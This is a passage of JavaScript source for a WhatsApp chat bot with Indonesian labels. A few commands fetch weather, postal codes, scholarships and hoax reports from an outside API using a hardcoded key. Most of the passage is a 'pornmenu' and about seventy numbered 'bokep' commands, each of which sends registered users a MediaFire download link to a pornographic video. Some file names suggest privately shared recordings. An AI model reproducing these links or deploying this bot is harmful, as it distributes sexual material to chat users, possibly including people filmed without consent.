  if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
  daerah = args[0]
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = `Tempat : ${get_result.tempat}\n`
  ini_txt += `Cuaca : ${get_result.cuaca}\n`
  ini_txt += `Angin : ${get_result.angin}\n`
  ini_txt += `Description : ${get_result.description}\n`
  ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
  ini_txt += `Suhu : ${get_result.suhu}\n`
  ini_txt += `Udara : ${get_result.udara}\n`
  ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
  await wann.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: freply })
  reply(ini_txt)
  break
//=========================================================
case 'kodepos':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
               daerah = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/kodepos?apikey=WannOff&query=${daerah}`)
               get_result = get_result.result[0]
               ini_txt = `Provinsi : ${get_result.province}\n`
               ini_txt += `Kabupaten : ${get_result.city}\n`
               ini_txt += `Kecamatan : ${get_result.subdistrict}\n`
               ini_txt += `Kelurahan : ${get_result.urban}\n`
               ini_txt += `Kode Pos : ${get_result.postalcode}`
               reply(ini_txt)
               break
//========================================================= 
case 'indbeasiswa':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/indbeasiswa?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = 'Info Beasiswa :\n'
  for (var x of get_result) {
      ini_txt += `Title : ${x.title}\n`
      ini_txt += `Link : ${x.link}\n\n`
  }
  reply(ini_txt)
  break                  
//=========================================================
case 'hoax':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/turnbackhoax?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = 'Info Hoax :\n'
  for (var x of get_result) {
      ini_txt += `Title : ${x.title}\n`
      ini_txt += `Link : ${x.link}\n`
      ini_txt += `Posted : ${x.posted}\n`
      ini_txt += `Description : ${x.desc}\n\n`
  }
  reply(ini_txt)
  break
//======================================================================================================= 
case 'pornmenu':
  wann.sendMessage(from, porn(prefix), MessageType.text, {quoted: freply})
  break
  
  case 'bokep1':		
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})		      
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' })
      break
//=========================================================
case 'bokep2':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wan.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' })
      break 
//=========================================================
case 'bokep3':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file' })				    
      break 
//========================================================= 
case 'bokep4':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' })				   
      break
//=========================================================
case 'bokep5':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' })				   
      break
//=========================================================
case 'bokep6':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' })				   
       break
//=========================================================
case 'bokep7':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' })				   
      break
//=========================================================
case 'bokep8':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file' })				   
      break
//=========================================================
case 'bokep10':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
qute = fs.readFileSync('media/Menu.jpg') 
   wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' })				   
   break
//=========================================================
case 'bokep11':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})	
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file' })				   
      break
//=========================================================
case 'bokep12':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})				    
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file' })				   
      break
//=========================================================
case 'bokep13':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file' })				   
      break
//=========================================================
case 'bokep14':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file' })				   
      break
//=========================================================
case 'bokep15':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file' })				   
      break
//=========================================================
case 'bokep16':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
       qute = fs.readFileSync('media/Menu.jpg') 
       wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file' })				   
       break
//=========================================================
case 'bokep17':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})	
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ecly00at6adxs20/VID-20210107-WA1540.mp4/file' })				   
      break
//=========================================================
case 'bokep18':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/7qkn8nuog22jsco/VID-20210107-WA1534.mp4/file' })				   
      break
//=========================================================
case 'bokep19':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})			 				
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/vza5uaben93dfdr/VID-20210107-WA1527.mp4/file' })				   
      break
//=========================================================
case 'bokep20':		
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})	
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/l7uzd4v9p95wpeb/VID-20210107-WA1541.mp4/file' })				   
      break
//=========================================================
case 'bokep21':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})			 				
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/icpnxsr18j6l2pp/VID-20210107-WA1528.mp4/file' })				   
      break
//=========================================================
case 'bokep22':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})	
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/cscj9taoq5s5oj9/VID-20210107-WA1538.mp4/file' })				   
      break
//=========================================================
case 'bokep23':	
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/saer161lthn4sy3/VID-20210107-WA1525.mp4/file' })				   
      break
//=========================================================
case 'bokep24':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \\nhttps://www.mediafire.com/file/9jy3nj2b2ljjzxb/VID-20210107-WA1539.mp4/file' })				   
       break
 //===========================================================  
 //=====================================================================================================================================================================================
case 'bokep25':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/w3xd3btju78s9ag/1_5012836500744700312.mp4/file' })				   
       break
//=========================================================
case 'bokep26':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/yv14rur1pzkr8b0/1_4976833430579839265.mp4/file' })				   
       break
//=========================================================
case 'bokep27':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/68zfiyemxtru1bs/1_4904503780428480986.mp4/file' })				   
       break
//=========================================================
case 'bokep28':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/7dnbhv3ciba8hhq/1_4904503780428480985.mp4/file' })				   
       break
//=========================================================
case 'bokep29':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/j9fs5zmlx3dh8mr/1_4904503780428480984.mp4/file' })				   
       break
//=========================================================
case 'bokep30':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/p92nobw93fecsw1/received_1003270563800215.mp4/file' })				   
       break
//=========================================================
case 'bokep31':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/qpsw216x7eg6hju/received_876459109648973.mp4/file' })				   
       break
//=========================================================
case 'bokep32':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/bi7vvyuutmwyva4/received_561878425067374.mp4/file' })				   
       break
//=========================================================
case 'bokep33':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/xovkeeb1bzb2p6q/received_604288827411481.mp4/file' })				   
       break
//=========================================================
case 'bokep34':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/fqbo50dagpx4a3c/received_583141349398702.mp4/file' })				   
       break
//=========================================================
case 'bokep35':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/z9cdyckbtsw0bik/received_605185650481223.mp4/file' })				   
       break
//=========================================================
case 'bokep36':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/z943hvp2utw26w8/received_403005374674502.mp4/file' })				   
       break
//=========================================================
case 'bokep37':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/spnjhu5o0hs7q5p/received_1484486988600024.mp4/file' })				   
       break
//=========================================================
case 'bokep38':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/25q6chd1j1f4ykl/received_4418039004978580.mp4/file' })				   
       break
//=========================================================
case 'bokep39':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ta2svq1u27pdj2v/received_632639654567218.mp4/file' })				   
       break
//=========================================================
case 'bokep40':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/jkyrnt34eb4a7xj/received_253314510046052.mp4/file' })				   
       break
//=========================================================
case 'bokep41':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/twu834cnvuqc1rw/received_1432512500467806.mp4/file' })				   
       break
//=========================================================
case 'bokep42':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/6gctjkwlj7mukjb/received_351197870087553.mp4/file' })				   
       break
//=========================================================
case 'bokep43':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/jpqj8ri4z871t50/received_4393779417324000.mp4/file' })				   
       break
//=========================================================
case 'bokep44':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/bbycc5vwuxvgd47/received_571836733939095.mp4/file' })				   
       break
//=========================================================
case 'bokep45':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/g1nl5a0smd2oi33/received_240063647954902.mp4/file' })				   
       break
//=========================================================
case 'bokep46':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/q0qwxuinrryjd80/received_299673458179634.mp4/file' })				   
       break
//=========================================================
case 'bokep47':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/0pbbul0x907ik78/received_564651334587420.mp4/file' })				   
       break
//=========================================================
case 'bokep48':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/m6y7mj4l59oq5ju/received_1136049133591127.mp4/file' })				   
       break
//=========================================================
case 'bokep49':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tqjecvlp5jdomhg/received_458258245425414.mp4/file' })				   
       break
//=========================================================
case 'bokep50':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/th8cchtyp5y1l0j/received_3029759737301851.mp4/file' })				   
       break
//=========================================================
case 'bokep51':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/5studipf789ut1i/received_162667669380689.mp4/file' })				   
       break
//=========================================================
case 'bokep52':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/jr9kd9lo0rshfnc/received_492047558937708.mp4/file' })				   
       break
//=========================================================
case 'bokep53':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/trg1m5bs22daq13/received_1058073754965172.mp4/file' })				   
       break
//=========================================================
case 'bokep54':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/84tjcg8lfigchsh/received_4227104060750060.mp4/file' })				   
       break
//=========================================================
case 'bokep55':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/4wdzdyewf9hdhl1/received_390083809441180.mp4/file' })				   
       break
//=========================================================
case 'bokep56':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/c8zjcw3gjlo1jlw/received_389467039555184.mp4/file' })				   
       break
//=========================================================
case 'bokep57':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dziuepg6m5bhfkl/received_399251051830914.mp4/file' })				   
       break
//=========================================================
case 'bokep58':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/4bpl7m7qseetxni/received_3097536497238052.mp4/file' })				   
       break
//=========================================================
case 'bokep59':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/1v7980xpuu0oonn/received_584624689245337.mp4/file' })				   
       break
//=========================================================
case 'bokep60':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ch634xh1fc9qfhk/received_1666211303778780.mp4/file' })				   
       break
//=========================================================
case 'bokep61':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/0hsizq9yowiu6u9/received_590652791967744.mp4/file' })				   
       break
//=========================================================
case 'bokep62':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/61wklfu7icfrr1k/received_4259380677520916.mp4/file' })				   
       break
//=========================================================
case 'bokep63':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dqjcd8tpo4cu471/received_269741168374510.mp4/file' })				   
       break
//=========================================================
case 'bokep64':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/9fy9dsm8ink8aaq/received_957169441499997.mp4/file' })				   
       break
//=========================================================  
case 'bokep65':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/hdxw18b28jqszev/received_880297542613744.mp4/file' })				   
       break
//=========================================================
case 'bokep66':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/5b80x1q47ody0v5/received_605942373760921.mp4/file' })				   
       break
//=========================================================
case 'bokep67':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ua0e1om3k9mbl0a/received_1027423954495771.mp4/file' })				   
       break
//=========================================================
case 'bokep68':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/9ybkxix5c2igbgi/received_1661970210679064.mp4/file' })				   
       break
//=========================================================
case 'bokep69':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/l2148ap908483x0/received_468655110911870.mp4/file' })				   
       break
//=========================================================
case 'bokep70':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
      wann.sendMessage(from, qute, image, { quoted: freply, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/rya23e0lcwnww7t/received_391252732663323.mp4/file' })				   
       break
//=========================================================
case 'bokep71':				 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
      qute = fs.readFileSync('media/Menu.jpg') 
